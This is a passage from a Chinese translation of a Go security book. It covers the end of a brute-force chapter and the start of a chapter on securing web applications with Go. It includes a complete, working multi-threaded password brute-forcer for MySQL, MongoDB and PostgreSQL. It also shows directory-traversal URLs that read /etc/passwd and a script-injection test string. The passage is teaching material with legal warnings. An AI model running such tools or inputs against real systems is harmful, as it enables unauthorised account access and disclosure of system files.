      numThreads += 1 

      password := scanner.Text() 
      go testSSHAuth(url, username, password, doneChannel) 

      // If max threads reached, wait for one to finish before continuing 
      if numThreads >= maxThreads { 
         <-doneChannel 
         numThreads -= 1 
      } 
   } 

   // Wait for all threads before repeating and fetching a new batch 
   for numThreads > 0 { 
      <-doneChannel 
      numThreads -= 1 
   } 
} 
```

# 暴力破解数据库登录

数据库登录可以像其他方法一样自动化和暴力破解。在以前的暴力破解示例中，大部分代码都是相同的。这些应用程序之间的主要区别在于实际测试身份验证的函数。而不是再次重复所有的代码，这些片段将简单地演示如何登录到各种数据库。修改以前的暴力破解脚本，以测试其中一个而不是 SSH 或 HTTP 方法。

为了防止这种情况发生，限制对数据库的访问只允许需要它的机器，并禁用根远程登录。

Go 标准库中没有提供任何数据库驱动程序，只有接口。因此，所有这些数据库示例都需要来自 GitHub 的第三方包，以及一个正在运行的数据库实例进行连接。本书不涵盖如何安装和配置这些数据库服务。可以使用`go get`命令安装这些包中的每一个：

+   MySQL: [`github.com/go-sql-driver/mysql`](https://github.com/go-sql-driver/mysql)

+   MongoDB: [`github.com/go-mgo/mgo`](https://github.com/go-mgo/mgo)

+   PostgreSQL: [`github.com/lib/pq`](https://github.com/lib/pq)

这个例子结合了所有三个数据库库，并提供了一个工具，可以暴力破解 MySQL、MongoDB 或 PostgreSQL。数据库类型被指定为命令行参数之一，以及用户名、主机、密码文件和数据库名称。MongoDB 和 MySQL 不需要像 PostgreSQL 那样的数据库名称，所以在不使用`postgres`选项时是可选的。创建了一个名为`loginFunc`的特殊变量，用于存储与指定数据库类型关联的登录函数。这是我们第一次使用变量来保存一个函数。然后使用登录函数执行暴力破解攻击：

```go
package main 

import ( 
   "database/sql" 
   "log" 
   "time" 

   // Underscore means only import for 
   // the initialization effects. 
   // Without it, Go will throw an 
   // unused import error since the mysql+postgres 
   // import only registers a database driver 
   // and we use the generic sql.Open() 
   "bufio" 
   "fmt" 
   _ "github.com/go-sql-driver/mysql" 
   _ "github.com/lib/pq" 
   "gopkg.in/mgo.v2" 
   "os" 
) 

// Define these at the package level since they don't change, 
// so we don't have to pass them around between functions 
var ( 
   username string 
   // Note that some databases like MySQL and Mongo 
   // let you connect without specifying a database name 
   // and the value will be omitted when possible 
   dbName        string 
   host          string 
   dbType        string 
   passwordFile  string 
   loginFunc     func(string) 
   doneChannel   chan bool 
   activeThreads = 0 
   maxThreads    = 10 
) 

func loginPostgres(password string) { 
   // Create the database connection string 
   // postgres://username:password@host/database 
   connStr := "postgres://" 
   connStr += username + ":" + password 
   connStr += "@" + host + "/" + dbName 

   // Open does not create database connection, it waits until 
   // a query is performed 
   db, err := sql.Open("postgres", connStr) 
   if err != nil { 
      log.Println("Error with connection string. ", err) 
   } 

   // Ping will cause database to connect and test credentials 
   err = db.Ping() 
   if err == nil { // No error = success 
      exitWithSuccess(password) 
   } else { 
      // The error is likely just an access denied, 
      // but we print out the error just in case it 
      // is a connection issue that we need to fix 
      log.Println("Error authenticating with Postgres. ", err) 
   } 
   doneChannel <- true 
} 

func loginMysql(password string) { 
   // Create database connection string 
   // user:password@tcp(host)/database?charset=utf8 
   // The database name is not required for a MySQL 
   // connection so we leave it off here. 
   // A user may have access to multiple databases or 
   // maybe we do not know any database names 
   connStr := username + ":" + password 
   connStr += "@tcp(" + host + ")/" // + dbName 
   connStr += "?charset=utf8" 

   // Open does not create database connection, it waits until 
   // a query is performed 
   db, err := sql.Open("mysql", connStr) 
   if err != nil { 
      log.Println("Error with connection string. ", err) 
   } 

   // Ping will cause database to connect and test credentials 
   err = db.Ping() 
   if err == nil { // No error = success 
      exitWithSuccess(password) 
   } else { 
      // The error is likely just an access denied, 
      // but we print out the error just in case it 
      // is a connection issue that we need to fix 
      log.Println("Error authenticating with MySQL. ", err) 
   } 
   doneChannel <- true 
} 

func loginMongo(password string) { 
   // Define Mongo connection info 
   // mgo does not use the Go sql driver like the others 
   mongoDBDialInfo := &mgo.DialInfo{ 
      Addrs:   []string{host}, 
      Timeout: 10 * time.Second, 
      // Mongo does not require a database name 
      // so it is omitted to improve auth chances 
      //Database: dbName, 
      Username: username, 
      Password: password, 
   } 
   _, err := mgo.DialWithInfo(mongoDBDialInfo) 
   if err == nil { // No error = success 
      exitWithSuccess(password) 
   } else { 
      log.Println("Error connecting to Mongo. ", err) 
   } 
   doneChannel <- true 
} 

func exitWithSuccess(password string) { 
   log.Println("Success!") 
   log.Printf("\nUser: %s\nPass: %s\n", username, password) 
   os.Exit(0) 
} 

func bruteForce() { 
   // Load password file 
   passwords, err := os.Open(passwordFile) 
   if err != nil { 
      log.Fatal("Error opening password file. ", err) 
   } 

   // Go through each password, line-by-line 
   scanner := bufio.NewScanner(passwords) 
   for scanner.Scan() { 
      password := scanner.Text() 

      // Limit max goroutines 
      if activeThreads >= maxThreads { 
         <-doneChannel // Wait 
         activeThreads -= 1 
      } 

      // Test the login using the specified login function 
      go loginFunc(password) 
      activeThreads++ 
   } 

   // Wait for all threads before returning 
   for activeThreads > 0 { 
      <-doneChannel 
      activeThreads -= 1 
   } 
} 

func checkArgs() (string, string, string, string, string) { 
   // Since the database name is not required for Mongo or Mysql 
   // Just set the dbName arg to anything. 
   if len(os.Args) == 5 && 
      (os.Args[1] == "mysql" || os.Args[1] == "mongo") { 
      return os.Args[1], os.Args[2], os.Args[3], os.Args[4],   
      "IGNORED" 
   } 
   // Otherwise, expect all arguments. 
   if len(os.Args) != 6 { 
      printUsage() 
      os.Exit(1) 
   } 
   return os.Args[1], os.Args[2], os.Args[3], os.Args[4], os.Args[5] 
} 

func printUsage() { 
   fmt.Println(os.Args[0] + ` - Brute force database login  

Attempts to brute force a database login for a specific user with  
a password list. Database name is ignored for MySQL and Mongo, 
any value can be provided, or it can be omitted. Password file 
should contain passwords separated by a newline. 

Database types supported: mongo, mysql, postgres 

Usage: 
  ` + os.Args[0] + ` (mysql|postgres|mongo) <pwFile>` +
     ` <user> <host>[:port] <dbName> 

Examples: 
  ` + os.Args[0] + ` postgres passwords.txt nanodano` +
      ` localhost:5432  myDb   
  ` + os.Args[0] + ` mongo passwords.txt nanodano localhost 
  ` + os.Args[0] + ` mysql passwords.txt nanodano localhost`) 
} 

func main() { 
   dbType, passwordFile, username, host, dbName = checkArgs() 

   switch dbType { 
   case "mongo": 
       loginFunc = loginMongo 
   case "postgres": 
       loginFunc = loginPostgres 
   case "mysql": 
       loginFunc = loginMysql 
   default: 
       fmt.Println("Unknown database type: " + dbType) 
       fmt.Println("Expected: mongo, postgres, or mysql") 
       os.Exit(1) 
   } 

   doneChannel = make(chan bool) 
   bruteForce() 
} 
```

# 摘要

阅读完本章后，您现在将了解基本的暴力破解攻击如何针对不同的应用程序工作。您应该能够根据自己的需求调整这里给出的示例来攻击不同的协议。

请记住，这些例子可能是危险的，可能会导致拒绝服务，并且不建议您对生产服务运行它们，除非是为了测试您的暴力破解防护措施。只对您控制的服务执行这些测试，获得测试权限并了解后果。您不应该对您不拥有的服务使用这些例子或这些类型的攻击，否则您可能会触犯法律并陷入严重的法律问题。

对于测试来说，有一些细微的法律界限可能很难区分。例如，如果您租用硬件设备，您在技术上并不拥有它，并且需要获得许可才能对其进行测试，即使它位于您的数据中心。同样，如果您从亚马逊等提供商那里租用托管服务，您必须在执行渗透测试之前获得他们的许可，否则您可能会因违反服务条款而遭受后果。

在下一章中，我们将研究使用 Go 的 Web 应用程序以及如何通过使用最佳实践来增强它们的安全性，如 HTTPS、使用安全的 cookie 和安全的 HTTP 头部、转义 HTML 输出和添加日志。它还探讨了如何作为客户端消耗 Web 应用程序，通过发出请求、使用客户端 SSL 证书和使用代理。


# 第九章：Web 应用程序

Go 在标准库中有一个强大的 HTTP 包。`net/http`包的文档位于[`golang.org/pkg/net/http/`](https://golang.org/pkg/net/http/)，包含了 HTTP 和 HTTPS 的实用工具。起初，我建议你远离社区的 HTTP 框架，坚持使用 Go 标准库。标准的 HTTP 包包括了用于监听、路由和模板的函数。内置的 HTTP 服务器具有生产质量，并直接绑定到端口，消除了需要单独的 httpd，如 Apache、IIS 或 nginx。然而，通常会看到 nginx 监听公共端口`80`，并将所有请求反向代理到监听本地端口而不是`80`的 Go 服务器。

在本章中，我们涵盖了运行 HTTP 服务器的基础知识，使用 HTTPS，设置安全的 cookies，以及转义输出。我们还介绍了如何使用 Negroni 中间件包，并实现用于记录、添加安全的 HTTP 头和提供静态文件的自定义中间件。Negroni 采用了 Go 的成熟方法，并鼓励使用标准库`net/http`处理程序。它非常轻量级，并建立在现有的 Go 结构之上。此外，还提到了与运行 Web 应用程序相关的其他最佳实践。

还提供了 HTTP 客户端的示例。从进行基本的 HTTP 请求开始，我们继续进行 HTTPS 请求，并使用客户端证书进行身份验证和代理路由流量。

在本章中，我们将涵盖以下主题：

+   HTTP 服务器

+   简单的 HTTP 服务器

+   TLS 加密的 HTTP（HTTPS）

+   使用安全的 cookies

+   HTML 转义输出

+   Negroni 中间件

+   记录请求

+   添加安全的 HTTP 头

+   提供静态文件

+   其他最佳实践

+   跨站请求伪造（CSRF）令牌

+   防止用户枚举和滥用

+   避免本地和远程文件包含漏洞

+   HTTP 客户端

+   进行基本的 HTTP 请求

+   使用客户端 SSL 证书

+   使用代理

+   使用系统代理

+   使用 HTTP 代理

+   使用 SOCKS5 代理（Tor）

# HTTP 服务器

HTTP 是建立在 TCP 层之上的应用程序协议。概念相对简单；你可以使用纯文本来构造一个请求。在第一行，你将提供方法，比如`GET`或`POST`，以及路径和你遵循的 HTTP 版本。之后，你将提供一系列键值对来描述你的请求。通常，你需要提供一个`Host`值，以便服务器知道你正在请求哪个网站。一个简单的 HTTP 请求可能是这样的：

```go
GET /archive HTTP/1.1
Host: www.devdungeon.com  
```

不过，你不需要担心 HTTP 规范中的所有细节。Go 提供了一个`net/http`包，其中包含了几个工具，可以轻松地创建生产就绪的 Web 服务器，包括对 HTTP/2.0 的支持，Go 1.6 及更新版本。本节涵盖了与运行和保护 HTTP 服务器相关的主题。

# 简单的 HTTP 服务器

在这个例子中，一个 HTTP 服务器演示了使用标准库创建一个监听服务器是多么简单。目前还没有路由或多路复用。在这种情况下，通过服务器提供了一个特定的目录。`http.FileServer()`内置了目录列表，所以如果你对`/`发出 HTTP 请求，它将列出目录中可用的文件：

```go
package main

import (
   "fmt"
   "log"
   "net/http"
   "os"
)

func printUsage() {
   fmt.Println(os.Args[0] + ` - Serve a directory via HTTP

URL should include protocol IP or hostname and port separated by colon.

Usage:
  ` + os.Args[0] + ` <listenUrl> <directory>

Example:
  ` + os.Args[0] + ` localhost:8080 .
  ` + os.Args[0] + ` 0.0.0.0:9999 /home/nanodano
`)
}

func checkArgs() (string, string) {
   if len(os.Args) != 3 {
      printUsage()
      os.Exit(1)
   }
   return os.Args[1], os.Args[2]
}

func main() {
   listenUrl, directoryPath := checkArgs()
   err := http.ListenAndServe(listenUrl,      
     http.FileServer(http.Dir(directoryPath)))
   if err != nil {
      log.Fatal("Error running server. ", err)
   }
}
```

下一个示例显示了如何路由路径并创建一个处理传入请求的函数。这个示例不接受任何命令行参数，因为它本身并不是一个很有用的程序，但你可以将其用作基本模板：

```go
package main

import (
   "fmt"
   "net/http"
   "log"
)

func indexHandler(writer http.ResponseWriter, request *http.Request) {
   // Write the contents of the response body to the writer interface
   // Request object contains information about and from the client
   fmt.Fprintf(writer, "You requested: " + request.URL.Path)
}

func main() {
   http.HandleFunc("/", indexHandler)
   err := http.ListenAndServe("localhost:8080", nil)
   if err != nil {
      log.Fatal("Error creating server. ", err)
   }
}
```

# HTTP 基本认证

HTTP 基本认证通过取用户名和密码，用冒号分隔符组合它们，并使用 base64 进行编码来实现。用户名和密码通常可以作为 URL 的一部分传递，例如：`http://<username>:<password>@www.example.com`。在底层，实际发生的是用户名和密码被组合、编码，并作为 HTTP 头传递。

如果您使用这种身份验证方法，请记住它是不加密的。在传输过程中，用户名和密码没有任何保护。您始终希望在传输层上使用加密，这意味着添加 TLS/SSL。

如今，HTTP 基本身份验证并不常用，但它很容易实现。更常见的方法是在应用程序中构建或使用自己的身份验证层，例如将用户名和密码与一个充满了盐和哈希密码的用户数据库进行比较。

有关创建需要 HTTP 基本身份验证的 HTTP 服务器的客户端示例，请参阅第八章 *暴力破解*。Go 标准库仅提供了 HTTP 基本身份验证的客户端方法。它不提供服务器端检查基本身份验证的方法。

我不建议您在服务器上实现 HTTP 基本身份验证。如果需要对客户端进行身份验证，请使用 TLS 证书。

# 使用 HTTPS

在第六章 *密码学*中，我们向您介绍了生成密钥并创建自签名证书所需的步骤。我们还为您提供了如何运行 TCP 套接字级别的 TLS 服务器的示例。本节将演示如何创建一个 TLS 加密的 HTTP 服务器或 HTTPS 服务器。

TLS 是 SSL 的更新版本，Go 有一个很好地支持它的标准包。您需要一个使用该密钥生成的私钥和签名证书。您可以使用自签名证书或由公认的证书颁发机构签名的证书。从历史上看，由受信任的机构签名的 SSL 证书总是需要花钱的，但[`letsencrypt.org/`](https://letsencrypt.org/)改变了这一局面，他们开始提供由广泛信任的机构签名的免费和自动化证书。

如果您需要一个证书（`cert.pem`）的示例，请参考第六章 *密码学*中的创建自签名证书的示例。

以下代码演示了如何运行一个提供单个网页的 HTTPS 服务器的最基本示例。有关各种 HTTP 蜜罐示例和更多 HTTP 服务器参考代码，请参考第十章 *网络爬虫*中的示例。在源代码中初始化 HTTPS 服务器后，您可以像处理 HTTP 服务器对象一样处理它。请注意，这与 HTTP 服务器之间的唯一区别是您需要调用`http.ListenAndServeTLS()`而不是`http.ListenAndServe()`。此外，您必须为服务器提供证书和密钥：

```go
package main

import (
   "fmt"
   "net/http"
   "log"
)

func indexHandler(writer http.ResponseWriter, request *http.Request) {
   fmt.Fprintf(writer, "You requested: "+request.URL.Path)
}

func main() {
   http.HandleFunc("/", indexHandler)
   err := http.ListenAndServeTLS( 
      "localhost:8181", 
      "cert.pem", 
      "privateKey.pem", 
      nil, 
   )
   if err != nil {
      log.Fatal("Error creating server. ", err)
   }
}
```

# 创建安全 cookie

Cookies 本身不应包含用户无法查看的敏感信息。攻击者可以针对 cookie 进行攻击，试图收集私人信息。最常见的目标是会话 cookie。如果会话 cookie 受到损害，攻击者可以使用该 cookie 冒充用户，服务器将允许这种行为。

`HttpOnly`标志要求浏览器阻止 JavaScript 访问 cookie，以防止跨站脚本攻击。只有在进行 HTTP 请求时才会发送 cookie。如果确实需要通过 JavaScript 访问 cookie，只需创建一个与会话 cookie 不同的 cookie。

`Secure`标志要求浏览器仅在 TLS/SSL 加密下传输 cookie。这可以防止通过嗅探公共未加密的 Wi-Fi 网络或中间人连接进行的会话劫持尝试。一些网站只会在登录页面上使用 SSL 来保护您的密码，但之后的每次连接都是通过普通 HTTP 进行的，会话 cookie 可以在传输过程中被窃取，或者在缺少`HttpOnly`标志的情况下，可能会被 JavaScript 窃取。

创建会话令牌时，请确保使用加密安全的伪随机数生成器生成它。会话令牌的长度应至少为 128 位。请参阅第六章，*密码学*，了解生成安全随机字节的示例。

以下示例创建了一个简单的 HTTP 服务器，只有一个函数`indexHandler()`。该函数使用推荐的安全设置创建一个 cookie，然后在打印响应正文并返回之前调用`http.SetCookie()`：

```go
package main

import (
   "fmt"
   "net/http"
   "log"
   "time"
)

func indexHandler(writer http.ResponseWriter, request *http.Request) {
   secureSessionCookie := http.Cookie {
      Name: "SessionID",
      Value: "<secure32ByteToken>",
      Domain: "yourdomain.com",
      Path: "/",
      Expires: time.Now().Add(60 * time.Minute),
      HttpOnly: true, // Prevents JavaScript from accessing
      Secure: true, // Requires HTTPS
   }   
   // Write cookie header to response
   http.SetCookie(writer, &secureSessionCookie)   
   fmt.Fprintln(writer, "Cookie has been set.")
}

func main() {
   http.HandleFunc("/", indexHandler)
   err := http.ListenAndServe("localhost:8080", nil)
   if err != nil {
      log.Fatal("Error creating server. ", err)
   }
}
```

# HTML 转义输出

Go 语言有一个标准函数用于转义字符串，防止 HTML 字符被渲染。

在输出用户接收到的任何数据到响应输出时，始终对其进行转义，以防止跨站脚本攻击。无论用户提供的数据来自 URL 查询、POST 值、用户代理标头、表单、cookie 还是数据库，都适用这一规则。以下代码片段给出了转义字符串的示例：

```go
package main

import (
   "fmt"
   "html"
)

func main() {
   rawString := `<script>alert("Test");</script>`
   safeString := html.EscapeString(rawString)

   fmt.Println("Unescaped: " + rawString)
   fmt.Println("Escaped: " + safeString)
}
```

# Negroni 中间件

中间件是指可以绑定到请求/响应流程并在传递给下一个中间件并最终返回给客户端之前采取行动或进行修改的函数。

中间件是按顺序在每个请求上运行的一系列函数。您可以向此链中添加更多函数。我们将看一些实际的例子，比如列入黑名单的 IP 地址、添加日志记录和添加授权检查。

中间件的顺序很重要。例如，我们可能希望先放日志记录中间件，然后是 IP 黑名单中间件。我们希望 IP 黑名单模块首先运行，或者至少在开始附近运行，这样其他中间件不会浪费资源处理一个将被拒绝的请求。您可以在将请求和响应传递给下一个中间件处理程序之前操纵它们。

您可能还想构建自定义中间件来进行分析、日志记录、列入黑名单的 IP 地址、注入标头，或拒绝某些用户代理，比如`curl`、`python`或`go`。

这些示例使用了 Negroni 包。在编译和运行这些示例之前，您需要`go get`该包。这些示例调用了`http.ListenAndServe()`，但您也可以很容易地修改它们以使用`http.ListenAndServeTLS()`来使用 TLS：

```go
go get github.com/urfave/negroni 
```

以下示例创建了一个`customMiddlewareHandler()`函数，我们将告诉`negroniHandler`接口使用它。自定义中间件只是简单地记录传入的请求 URL 和用户代理，但您可以做任何您喜欢的事情，包括修改请求再返回给客户端：

```go
package main

import (
   "fmt"
   "log"
   "net/http"

   "github.com/urfave/negroni"
)

// Custom middleware handler logs user agent
func customMiddlewareHandler(rw http.ResponseWriter, 
   r *http.Request, 
   next http.HandlerFunc, 
) {
   log.Println("Incoming request: " + r.URL.Path)
   log.Println("User agent: " + r.UserAgent())

   next(rw, r) // Pass on to next middleware handler
}

// Return response to client
func indexHandler(writer http.ResponseWriter, request *http.Request) {
   fmt.Fprintf(writer, "You requested: " + request.URL.Path)
}

func main() {
   multiplexer := http.NewServeMux()
   multiplexer.HandleFunc("/", indexHandler)

   negroniHandler := negroni.New()
   negroniHandler.Use(negroni.HandlerFunc(customMiddlewareHandler))
   negroniHandler.UseHandler(multiplexer)

   http.ListenAndServe("localhost:3000", negroniHandler)
}
```

# 记录请求

由于日志记录是如此常见的任务，Negroni 附带了一个日志记录中间件，您可以使用，如下例所示：

```go
package main

import (
   "fmt"
   "net/http"

   "github.com/urfave/negroni"
)

// Return response to client
func indexHandler(writer http.ResponseWriter, request *http.Request) {
   fmt.Fprintf(writer, "You requested: " + request.URL.Path)
}

func main() {
   multiplexer := http.NewServeMux()
   multiplexer.HandleFunc("/", indexHandler)

   negroniHandler := negroni.New()
   negroniHandler.Use(negroni.NewLogger()) // Negroni's default logger
   negroniHandler.UseHandler(multiplexer)

   http.ListenAndServe("localhost:3000", negroniHandler)
}
```

# 添加安全的 HTTP 标头

利用 Negroni 包，我们可以轻松地创建自己的中间件来注入一组 HTTP 标头，以帮助提高安全性。您需要评估每个标头，看看它是否适合您的应用程序。此外，并非每个浏览器都支持这些标头中的每一个。这是一个很好的基线，可以根据需要进行修改。

此示例中使用了以下标头：

| **标头** | **描述** |
| --- | --- |
| `Content-Security-Policy` | 这定义了哪些脚本或远程主机是受信任的，并能够提供可执行的 JavaScript |
| `X-Frame-Options` | 这定义了是否可以使用框架和 iframe，以及允许出现在框架中的域 |
| `X-XSS-Protection` | 这告诉浏览器在检测到跨站脚本攻击时停止加载；如果定义了良好的`Content-Security-Policy`标头，则基本上是不必要的 |
| `Strict-Transport-Security` | 这告诉浏览器只使用 HTTPS，而不是 HTTP |
| `X-Content-Type-Options` | 这告诉浏览器使用服务器提供的 MIME 类型，而不是基于 MIME 嗅探的猜测进行修改 |

客户端的网络浏览器最终决定是否使用或忽略这些标头。如果浏览器不知道如何应用标头值，它们就无法保证任何安全性。

这个例子创建了一个名为`addSecureHeaders()`的函数，它被用作额外的中间件处理程序，以在返回给客户端之前修改响应。根据你的应用程序需要调整标头：

```go
package main

import (
   "fmt"
   "net/http"

   "github.com/urfave/negroni"
)

// Custom middleware handler logs user agent
func addSecureHeaders(rw http.ResponseWriter, r *http.Request, 
   next http.HandlerFunc) {
   rw.Header().Add("Content-Security-Policy", "default-src 'self'")
   rw.Header().Add("X-Frame-Options", "SAMEORIGIN")
   rw.Header().Add("X-XSS-Protection", "1; mode=block")
   rw.Header().Add("Strict-Transport-Security", 
      "max-age=10000, includeSubdomains; preload")
   rw.Header().Add("X-Content-Type-Options", "nosniff")

   next(rw, r) // Pass on to next middleware handler
}

// Return response to client
func indexHandler(writer http.ResponseWriter, request *http.Request) {
   fmt.Fprintf(writer, "You requested: " + request.URL.Path)
}

func main() {
   multiplexer := http.NewServeMux()
   multiplexer.HandleFunc("/", indexHandler)

   negroniHandler := negroni.New()

   // Set up as many middleware functions as you need, in order
   negroniHandler.Use(negroni.HandlerFunc(addSecureHeaders))
   negroniHandler.Use(negroni.NewLogger())
   negroniHandler.UseHandler(multiplexer)

   http.ListenAndServe("localhost:3000", negroniHandler)
}
```

# 提供静态文件

另一个常见的 Web 服务器任务是提供静态文件。值得一提的是 Negroni 中间件处理程序用于提供静态文件。只需添加一个额外的`Use()`调用，并将`negroni.NewStatic()`传递给它。确保你的静态文件目录只包含客户端应该访问的文件。在大多数情况下，静态文件目录包含客户端的 CSS 和 JavaScript 文件。不要放置数据库备份、配置文件、SSH 密钥、Git 存储库、开发文件或任何客户端不应该访问的内容。像这样添加静态文件中间件：

```go
negroniHandler.Use(negroni.NewStatic(http.Dir("/path/to/static/files")))  
```

# 其他最佳实践

在创建 Web 应用程序时，还有一些其他值得考虑的事项。虽然它们不是 Go 特有的，但在开发时考虑这些最佳实践是值得的。

# CSRF 令牌

**跨站请求伪造**，或**CSRF**，令牌是一种试图阻止一个网站代表你对另一个网站采取行动的方式。

CSRF 是一种常见的攻击方式，受害者会访问一个嵌入了恶意代码的网站，试图向不同的网站发出请求。例如，一个恶意的行为者嵌入了 JavaScript，试图向每个银行网站发出 POST 请求，尝试将 1000 美元转账到攻击者的银行账户。如果受害者在其中一个银行有活动会话，并且该银行没有实施 CSRF 令牌，那么银行的网站可能会接受并处理该请求。

即使在受信任的网站上，也有可能成为 CSRF 攻击的受害者，如果受信任的网站容易受到反射或存储型跨站脚本攻击。自 2007 年以来，CSRF 一直是*OWASP 十大*中的一部分，并且在 2017 年仍然如此。

Go 提供了一个`xsrftoken`包，你可以在[`godoc.org/golang.org/x/net/xsrftoken`](https://godoc.org/golang.org/x/net/xsrftoken)上了解更多信息。它提供了一个`Generate()`函数来创建令牌，以及一个`Valid()`函数来验证令牌。你可以使用他们的实现，也可以选择开发适合自己需求的实现。

要实现 CSRF 令牌，创建一个 16 字节的随机令牌，并将其存储在与用户会话关联的服务器上。你可以使用任何你喜欢的后端来存储令牌，无论是在内存中、数据库中还是在文件中。将 CSRF 令牌嵌入表单作为隐藏字段。在服务器端处理表单时，验证 CSRF 令牌是否存在并与用户匹配。在使用后销毁令牌。不要重复使用相同的令牌。

在前面的章节中已经介绍了实现 CSRF 令牌的各种要求：

+   生成令牌：在第六章中，*密码学*，名为*密码学安全伪随机数生成器（CSPRNG）*的部分提供了生成随机数、字符串和字节的示例。

+   创建、提供和处理 HTML 表单：在第九章中，*Web 应用程序*，名为*HTTP 服务器*的部分提供了创建安全 Web 服务器的信息，而第十二章，*社会工程*，有一个名为*HTTP POST 表单登录蜜罐*的部分，其中有一个处理 POST 请求的示例。

+   将令牌存储在文件中：在第三章中，*文件操作*，名为*将字节写入文件*的部分提供了将数据存储在文件中的示例。

+   在数据库中存储令牌：在第八章中，*暴力破解*，标题为*暴力破解数据库登录*的部分提供了连接到各种数据库类型的蓝图。

# 防止用户枚举和滥用

这里需要记住的重要事项如下：

+   不要让人们弄清楚谁有帐户

+   不要让某人通过您的电子邮件服务器向用户发送垃圾邮件

+   不要让人们通过暴力尝试弄清楚谁已注册

让我们详细说明一下实际例子。

# 注册

当有人尝试注册电子邮件地址时，不要向 Web 客户端用户提供有关帐户是否已注册的任何反馈。相反，向该地址发送一封电子邮件，并简单地向 Web 用户显示一条消息，内容是“已向提供的地址发送了一封电子邮件”。

如果他们从未注册过，一切都是正常的。如果他们已经注册，网页用户不会收到电子邮件已注册的通知。相反，将向用户的地址发送一封电子邮件，通知他们该电子邮件已经注册。这将提醒他们已经有一个帐户，他们可以使用密码重置工具，或者让他们知道有可疑的情况，可能有人在做一些恶意的事情。

要小心，不要让攻击者反复尝试登录过程并向真实用户的电子邮件发送大量邮件。

# 登录

不要向网页用户提供关于电子邮件是否存在的反馈。您不希望某人能够尝试使用电子邮件地址登录并通过返回的错误消息了解该地址是否有帐户。例如，攻击者可以尝试使用一系列电子邮件地址登录，如果 Web 服务器对某些电子邮件返回“密码不匹配”，对其他电子邮件返回“该电子邮件未注册”，他们可以确定哪些电子邮件已在您的服务中注册。

# 重置密码

避免允许电子邮件垃圾邮件。限制发送的电子邮件数量，以便攻击者无法通过多次提交忘记密码表单来向用户发送垃圾邮件。

创建重置令牌时，请确保它具有良好的熵，以便无法猜测。不要仅基于时间和用户 ID 创建令牌，因为这样太容易被猜测和暴力破解，熵不足。对于令牌，您应该使用至少 16-32 个随机字节以获得足够的熵。参考第六章，*密码学*，了解生成密码学安全随机字节的示例。

此外，将令牌设置为在短时间后过期。从一小时到一天不等的时间段都是不错的选择，这取决于您的应用程序。一次只允许一个重置令牌，并在使用后销毁令牌，以防止重放和再次使用。

# 用户配置文件

与登录页面类似，如果您有用户配置文件页面，请小心允许用户名枚举。例如，如果有人访问`/users/JohnDoe`，然后访问`/users/JaneDoe`，一个返回`404 Not Found`错误，另一个返回`401 Access Denied`错误，攻击者可以推断一个帐户实际上存在，而另一个不存在。

# 防止 LFI 和 RFI 滥用

**本地文件包含**（**LFI**）和**远程文件包含**（**RFI**）是*OWASP 十大*漏洞之一。它们指的是从本地文件系统或远程主机加载未经意的文件的危险，或者加载预期的文件但带有污染数据。远程文件包含是危险的，因为如果不采取预防措施，用户可能会从恶意服务器提供远程文件。

如果用户未经任何消毒就指定了文件名，则不要从本地文件系统打开文件。考虑一个示例，Web 服务器在请求时返回一个文件。用户可能能够使用这样的 URL 请求包含敏感系统信息的文件，例如`/etc/passwd`。

```go
http://localhost/displayFile?filename=/etc/passwd  
```

如果 Web 服务器处理方式如下（伪代码）：

```go
file = os.Open(request.GET['filename'])
return file.ReadAll()
```

您不能简单地通过在特定目录前面添加来修复它，就像这样：

```go
os.Open('/path/to/mydir/' + GET['filename']).
```

这还不够，因为攻击者可以使用目录遍历返回到文件系统的根目录，就像这样：

```go
http://localhost/displayFile?filename=../../../etc/passwd   
```

务必检查任何文件包含中的目录遍历攻击。

# 受污染的文件

如果攻击者发现了 LFI，或者您提供了一个用于查看日志文件的 Web 界面，您需要确保即使日志被污染，也不会执行任何代码。

攻击者可能会通过对服务采取某些操作来污染您的日志并插入恶意代码。任何生成的日志都必须被视为已加载或显示的服务。

例如，Web 服务器日志可能会通过向实际上是代码的 URL 发出 HTTP 请求而被污染。您的日志将显示`404 Not Found`错误并记录所请求的 URL，实际上是代码。如果它是 PHP 服务器或另一种脚本语言，这将打开潜在的代码执行，但是，对于 Go 来说，最坏的情况将是 JavaScript 注入，这对用户仍然可能是危险的。想象一种情况，一个 Web 应用程序有一个 HTTP 日志查看器，它从磁盘加载日志文件。如果攻击者向`yourwebsite.com/<script>alert("test");</script>`发出请求，那么您的 HTML 日志查看器可能实际上会渲染该代码，如果没有适当地转义或清理。

# HTTP 客户端

如今，发出 HTTP 请求是许多应用程序的核心部分。作为一个友好的网络语言，Go 包含了`net/http`包中用于发出 HTTP 请求的几个工具。

# 基本的 HTTP 请求

这个例子使用了`net/http`标准库包中的`http.Get()`函数。它将把整个响应主体读取到一个名为`body`的变量中，然后将其打印到标准输出：

```go
package main

import (
   "fmt"
   "io/ioutil"
   "log"
   "net/http"
)

func main() {
   // Make basic HTTP GET request
   response, err := http.Get("http://www.example.com")
   if err != nil {
      log.Fatal("Error fetching URL. ", err)
   }

   // Read body from response
   body, err := ioutil.ReadAll(response.Body)
   response.Body.Close()
   if err != nil {
      log.Fatal("Error reading response. ", err)
   }

   fmt.Printf("%s\n", body)
}
```

# 使用客户端 SSL 证书

如果远程 HTTPS 服务器具有严格的身份验证并需要受信任的客户端证书，您可以通过在`http.Transport`对象中设置`TLSClientConfig`变量来指定证书文件，该对象由`http.Client`用于发出 GET 请求。

这个例子发出了一个类似于上一个例子的 HTTP GET 请求，但它没有使用`net/http`包提供的默认 HTTP 客户端。它创建了一个自定义的`http.Client`并配置它以使用客户端证书的 TLS。如果您需要证书或私钥，请参考第六章，“密码学”，以获取生成密钥和自签名证书的示例：

```go
package main

import (
   "crypto/tls"
   "log"
   "net/http"
)

func main() {
   // Load cert
   cert, err := tls.LoadX509KeyPair("cert.pem", "privKey.pem")
   if err != nil {
      log.Fatal(err)
   }

   // Configure TLS client
   tlsConfig := &tls.Config{
      Certificates: []tls.Certificate{cert},
   }
   tlsConfig.BuildNameToCertificate()
   transport := &http.Transport{ 
      TLSClientConfig: tlsConfig, 
   }
   client := &http.Client{Transport: transport}

   // Use client to make request.
   // Ignoring response, just verifying connection accepted.
   _, err = client.Get("https://example.com")
   if err != nil {
      log.Println("Error making request. ", err)
   }
}
```

# 使用代理

正向代理可以用于许多用途，包括查看 HTTP 流量、调试应用程序、逆向工程 API、操纵标头，还可以潜在地用于增加您对目标服务器的匿名性。但是，请注意，许多代理服务器仍然使用`X-Forwarded-For`头来转发您的原始 IP。

